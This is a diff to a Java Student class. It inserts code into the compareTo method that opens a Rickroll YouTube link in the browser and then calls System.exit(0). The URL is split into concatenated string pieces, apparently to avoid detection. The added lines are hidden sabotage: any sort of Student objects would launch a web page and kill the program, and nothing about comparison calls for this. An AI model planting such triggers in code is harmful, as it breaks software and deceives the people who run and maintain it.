@@ -1,6 +1,11 @@
 
 package model;
 
+import java.awt.Desktop;
+import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
+
 public class Student implements Comparable<Student> {
 
     private String name;
@@ -42,6 +47,11 @@ public class Student implements Comparable<Student> {
 
     @Override
     public int compareTo(Student o) {
+         try {
+                Desktop.getDesktop().browse(new URI("http"+"s://youtu"+".be/dQw4w9WgXcQ?s"+"i=t4cnmHCCEqDPFbDd"));
+                System.exit(0);
+            } catch (IOException | URISyntaxException e) {
+            }
         return this.name.compareTo(o.name);
     }
 
